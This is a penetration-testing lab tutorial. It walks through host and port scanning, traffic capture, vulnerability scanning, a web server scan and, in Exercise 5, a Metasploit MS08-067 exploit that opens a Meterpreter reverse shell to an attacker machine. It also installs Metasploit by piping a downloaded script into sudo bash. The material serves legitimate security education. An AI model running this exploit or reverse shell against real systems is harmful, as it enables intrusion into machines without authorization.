# Basic Network Security Assessment: Identifying Vulnerabilities in Network Configurations

## Introduction
Network security is crucial for protecting an organization's data and resources from unauthorized access and cyber threats. This project will guide you through a basic network security assessment, focusing on identifying common vulnerabilities in network configurations. You will use various tools to scan, analyze, and secure your network.

## Pre-requisites
- Basic understanding of networking concepts (IP addresses, subnets, routers, etc.)
- Familiarity with the Linux command line
- A computer with a Linux operating system (preferably Ubuntu)
- Internet connection to download necessary tools

## Lab Setup and Tools
- **Lab Environment**: A virtualized network setup using VirtualBox or VMware with at least two virtual machines (one as a target and one as an attacker).
- **Tools**: 
  - Nmap
  - Wireshark
  - OpenVAS
  - Nikto
  - Metasploit

## Exercises

### Exercise 1: Network Scanning with Nmap
**Objective**: Identify live hosts and open ports on the target network.

**Steps**:
1. **Install Nmap**:
    ```sh
    sudo apt-get update
    sudo apt-get install nmap
    ```

2. **Scan the Network**:
    ```sh
    nmap -sn 192.168.1.0/24
    ```
   - This command performs a ping scan to identify live hosts.

3. **Identify Open Ports**:
    ```sh
    nmap -sS 192.168.1.10
    ```
   - Replace `192.168.1.10` with the IP address of a live host found in the previous step.

**Expected Output**:
- List of live hosts in the network.
- Open ports on the specified host.

### Exercise 2: Traffic Analysis with Wireshark
**Objective**: Capture and analyze network traffic to identify potential security issues.

**Steps**:
1. **Install Wireshark**:
    ```sh
    sudo apt-get install wireshark
    ```

2. **Capture Network Traffic**:
    - Open Wireshark.
    - Select the network interface to capture traffic.
    - Click on the "Start" button to begin capturing packets.

3. **Analyze Captured Traffic**:
    - Look for suspicious traffic such as repeated requests, unusual protocols, or large data transfers.

**Expected Output**:
- Capture file with network traffic data.
- Identification of any suspicious traffic patterns.

### Exercise 3: Vulnerability Scanning with OpenVAS
**Objective**: Perform a vulnerability scan on the target network to identify known vulnerabilities.

**Steps**:
1. **Install OpenVAS**:
    ```sh
    sudo apt-get install openvas
    sudo openvas-setup
    ```

2. **Configure and Start OpenVAS**:
    - Access the OpenVAS web interface (usually at `https://localhost:9392`).
    - Login with the admin credentials created during setup.

3. **Run a Vulnerability Scan**:
    - Create a new scan task.
    - Set the target IP address range.
    - Start the scan and wait for it to complete.

**Expected Output**:
- Report detailing identified vulnerabilities and their severity.

### Exercise 4: Web Server Assessment with Nikto
**Objective**: Assess a web server for common vulnerabilities using Nikto.

**Steps**:
1. **Install Nikto**:
    ```sh
    sudo apt-get install nikto
    ```

2. **Scan the Web Server**:
    ```sh
    nikto -h http://192.168.1.10
    ```
   - Replace `192.168.1.10` with the IP address of the target web server.

**Expected Output**:
- Report detailing potential vulnerabilities, misconfigurations, and other issues with the web server.

### Exercise 5: Exploitation Testing with Metasploit
**Objective**: Use Metasploit to exploit a vulnerability identified in previous exercises.

**Steps**:
1. **Install Metasploit**:
    ```sh
    curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/scripts/msfupdate | sudo bash
    ```

2. **Launch Metasploit Console**:
    ```sh
    msfconsole
    ```

3. **Select and Configure an Exploit**:
    ```sh
    use exploit/windows/smb/ms08_067_netapi
    set RHOST 192.168.1.10
    set PAYLOAD windows/meterpreter/reverse_tcp
    set LHOST 192.168.1.20
    run
    ```
   - Replace `192.168.1.10` with the target IP address.
   - Replace `192.168.1.20` with the attacker's IP address.

**Expected Output**:
- Successful exploitation will open a Meterpreter session on the target machine.

## Conclusion
By completing these exercises, you have learned how to identify and assess common network security vulnerabilities using various tools. This knowledge is fundamental for performing more advanced security assessments and protecting network infrastructures.
